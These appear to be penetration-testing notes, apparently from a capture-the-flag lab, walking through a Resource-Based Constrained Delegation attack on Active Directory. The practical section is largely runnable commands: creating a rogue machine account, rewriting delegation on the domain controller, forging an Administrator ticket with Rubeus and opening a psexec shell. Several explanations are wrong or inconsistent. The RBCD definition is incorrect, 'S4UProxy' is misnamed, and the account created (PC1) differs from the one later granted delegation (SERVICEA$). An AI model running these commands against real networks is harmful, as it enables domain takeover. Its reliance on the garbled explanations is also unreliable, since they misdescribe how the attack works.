
## Resource-Based Constraint Delegation

Resource-Based Constraint Delegation is a feature in Active Directory that allows administrators to specify which users or groups are allowed to delegate their permissions to other users or groups. This can be useful in situations where a user needs to perform a task that requires permissions that they do not have, but a user with the necessary permissions trusts them to perform the task on their behalf. For example, an administrator may allow a group of IT technicians to delegate their permissions to reset user passwords, as long as the request is made by a member of the HR department.

## Configuring RBCD

**RBCD** is configured by setting the `**msDS-AllowedToActOnBehalfOfOtherIdentity**` attribute. This attribute specifies which service accounts or systems are permitted to act on behalf of users to access the target resource.

To exploit this type of delegation, an attacker must gain access to an account with Write permissions on the targeted resource (computer object), such as `GenericAll`, `GenericWrite`, and `WriteDACL`. This access is necessary to modify the Resource-Based Constrained Delegation (RBCD) settings on the targeted resource.

## RBCD Attack Requirements and Flow

## Attack Requirements

- Obtain access to an account with Write permissions to modify a computer object’s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, granting permissions to the compromised account.
- Control an object with a Service Principal Name (SPN). This could involve using an existing computer where we hold administrator privileges or creating a fake computer object if necessary.

## Attack Steps

The steps below summarize the RBCD attack to understand the attack flow:

1. The attacker gains access to a domain user account that can add computers to the domain. By default, domain users are part of the Authenticated Users group, allowing them to add up to 10 computers to the domain.

**_Note:_** _Remember, it is not always the case; sometimes administrators will set the_ `_ms-ds-machineaccountquota_` _attribute to 0 to prevent these attacks.)_

2. The compromised user must have Write privileges over the targeted computer. Required permissions include `GenericAll`, `GenericWrite`, or `WriteDACL`.

3. The attacker modifies the target computer’s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to specify a service account they control.

4. The attacker requests a service ticket to impersonate a high-privileged user, such as a domain admin, to access the target computer.

5. Using the issued ticket, the attacker gains access to the target computer.
## Tools Required

#### 1. [PowerMad](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)
#### 2. [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)
#### 3. [Powershell AD module](https://github.com/samratashok/ADModule.git)
#### 4. [Impacket Tools](https://github.com/fortra/impacket)
#### 5. [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

#### S4UProxy

S4UProxy is a feature in Active Directory that allows a user to obtain a service ticket for a different user without knowing their password. This feature is typically used in situations where a service account needs to access a resource on behalf of a user, but the service account is not trusted to know the user's password. S4USelf works in a very similar way, allowing a user to obtain a ticket for itself. In a S4UProxy attack, an attacker exploits this feature to obtain a service ticket for a high-privileged account, such as an administrator account, without knowing the password for the account. The attacker can then use the service ticket to access resources and perform actions that are normally restricted to the high-privileged account.

## Practical Exploitation

##### Upload the FIles to the server using Evil-WinRM
```cmd
upload /path-to-the-file/{Files}.ps1
```

##### Import all the Modules
```cmd
. .\Powermad.ps1
. .\PowerView.ps1
Import-Module .\Microsoft.ActiveDirectory.Management.dll
. .\ActiveDirectory.psd1
```

Next, we check the value of the `ms-ds-machineaccountquota` attribute with the Active Directory `Get-ADDomain` command to see if our domain user can add machines to the domain.

##### Get the machine quota
```cmd
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
```

![[RBCD-1.webp]]
Also, we check the `msds-allowedtoactonbehalfofotheridentity` attribute with the PowerView`Get-DomainComputer` command to see how many services are listed on the computer.
```cmd
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```
![[RBCD-2.webp]]

### Chaining it together

First, we leverage [[#1. [PowerMad](https //github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1) |PowerMad]] to create a new machine account using our `GenericAll` privileges on the domain.

```cmd
New-MachineAccount -MachineAccount PC1 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

Now we set the `PrincipalsAllowedToDelegateToAccount` to allow for `SERVICEA` to impersonate any user against our target `DC`

```
Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount SERVICEA$
Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
```

Next, we use `Rubeus` to get a hash of our password. In a second step, we perform a the actual `S4U` attack, which can be done with Rubeus as well. Please note that this step abuses intended functionality, and requires the above mentioned misconfigurations to be present. In this case we have `GenericAll` or any other write privileges on the target machine, which allowed us to misconfigure the rest ourselves.

```
.\Rubeus.exe hash /password:123456 /user:SERVICEA$ /domain:support.htb

.\rubeus.exe s4u /user:SERVICEA$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /domain:support.htb  /ptt
```

This is the basic attack, but more work is needed to login, as the ticket is injected into memory by `Rubeus` and usually intended to use immediately within a multi-machine environment. Grab the ticket and format it, then convert it to a usable ticket for impacket.

```
echo <ticket> | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

Now we can use impacket psexec to login:

```
psexec.py -k -no-pass support.htb/Administrator@dc.support.htb -dc-ip 10.10.11.174 -target-ip 10.10.11.174
